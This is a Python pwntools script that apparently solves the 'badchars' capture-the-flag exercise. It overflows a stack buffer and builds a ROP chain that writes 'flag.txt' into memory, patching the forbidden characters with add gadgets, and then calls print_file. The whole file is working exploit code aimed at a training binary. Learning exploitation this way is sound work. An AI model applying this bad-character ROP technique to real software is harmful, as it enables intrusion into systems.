import time
from typing import List

from pwn import *


EXECUTABLE = "./badchars"
context.binary = elf = ELF(EXECUTABLE)
lib_badchars = ELF("./libbadchars.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr, alphabet=b"ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    log.success(f"Offset found: {offset}")
    exit()


flag_addr = 0x601040

file_name = b"flag.txt"
bad_chars = [b'a', b'g', b'x', b'.']


rop = ROP(elf, badchars=b''.join(bad_chars))

def rop_string(addr: int, string: bytes, badchars: List[bytes] = []) -> bytes:
    gadgets = {
        "move": elf.symbols.usefulGadgets + 0x0c, # mov qword ptr [r13], r12; ret;
        "add":  elf.symbols.usefulGadgets + 0x04, # add byte ptr [r15], r14b; ret;
    }
    place_string  = ROP(elf)
    fix_bad_chars = ROP(elf)

    # Add null byte
    if string[-1] != b'\x00':
        string = string + b'\x00'
    # Pad string
    if len(string) % 8 != 0:
        string = string + b'\x00' * (8 - (len(string) % 8))

    for i in range(len(string) // 8):
        string_part = string[i*8:(i+1)*8]

        fixed_string = b""
        for j, c in enumerate(string_part):
            c = c.to_bytes(1, byteorder="little")
            if c in badchars:
                fixed_string = fixed_string + b"A"

                # Fix this char
                fix_bad_chars(r14=(ord(c) - ord(b'A')) % 256, r15=addr + (i*8) + j)
                fix_bad_chars.raw(gadgets["add"])
            else:
                fixed_string = fixed_string + c

        # Place the string
        place_string(r12=fixed_string, r13=addr + i*8)
        place_string.raw(gadgets["move"])

    log.debug("Place string chain:\n" + place_string.dump())
    log.debug("Fix bad chars chain:\n" + fix_bad_chars.dump())

    return place_string.chain() + fix_bad_chars.chain()


payload  = b"A" * OFFSET
# Load string into memory
rop.raw(rop_string(flag_addr, file_name, bad_chars))
# Call print_file
rop.print_file(flag_addr)


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))
p.recvline()

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
